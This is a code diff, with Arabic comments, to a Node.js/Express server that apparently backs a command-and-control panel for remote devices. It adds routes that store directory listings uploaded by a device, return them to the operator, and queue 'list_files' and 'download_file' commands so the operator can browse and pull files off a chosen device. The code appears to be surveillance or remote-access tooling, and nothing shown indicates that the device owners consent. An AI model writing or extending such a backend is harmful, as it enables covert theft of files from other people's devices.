@@ -79,6 +79,22 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, files_count: files.length });
         }
         
+        // ✅ حفظ قائمة الملفات من مدير الملفات
+        if (data.type === 'file_list') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const fileListFile = path.join(deviceDir, 'file_list.json');
+            fs.writeFileSync(fileListFile, JSON.stringify({
+                path: data.path,
+                files: data.files,
+                timestamp: Date.now()
+            }, null, 2));
+            
+            return res.json({ success: true });
+        }
+        
         // ✅ البيانات العادية
         const deviceId = data.device_id || 'unknown';
         const deviceDir = path.join(dataDir, deviceId);
@@ -252,11 +268,17 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
-        // ✅ استرجاع الملفات المحملة
         if (action === 'get_files') {
             const filesFile = path.join(dataDir, deviceId, 'downloaded_files.json');
             if (fs.existsSync(filesFile)) return res.json(JSON.parse(fs.readFileSync(filesFile, 'utf8')));
             return res.json([]);
+        }
+        
+        // ✅ استرجاع قائمة الملفات من مدير الملفات
+        if (action === 'get_file_list') {
+            const fileListFile = path.join(dataDir, deviceId, 'file_list.json');
+            if (fs.existsSync(fileListFile)) return res.json(JSON.parse(fs.readFileSync(fileListFile, 'utf8')));
+            return res.json({ path: '/', files: [] });
         }
         
         if (action === 'get_data') {
@@ -288,12 +310,29 @@ app.post('/api.php', (req, res) => {
     try {
         const { device, command } = req.body;
         if (!device || !command) return res.json({ error: 'Device and command required' });
+        
         const deviceDir = path.join(dataDir, device);
         if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+        
         const commandsFile = path.join(deviceDir, 'commands.json');
         let commands = [];
         if (fs.existsSync(commandsFile)) commands = JSON.parse(fs.readFileSync(commandsFile, 'utf8'));
-        commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+        
+        // ✅ أمر list_files
+        if (command.startsWith('list_files:')) {
+            const filePath = command.replace('list_files:', '');
+            commands.push({ command: 'list_files', path: filePath, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+        }
+        // ✅ أمر download_file
+        else if (command.startsWith('download_file:')) {
+            const filePath = command.replace('download_file:', '');
+            commands.push({ command: 'download_file', path: filePath, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+        }
+        // ✅ أوامر عادية
+        else {
+            commands.push({ command, timestamp: Math.floor(Date.now()/1000), status: 'pending' });
+        }
+        
         fs.writeFileSync(commandsFile, JSON.stringify(commands));
         res.json({ success: true });
     } catch (e) { res.json({ error: e.message }); }
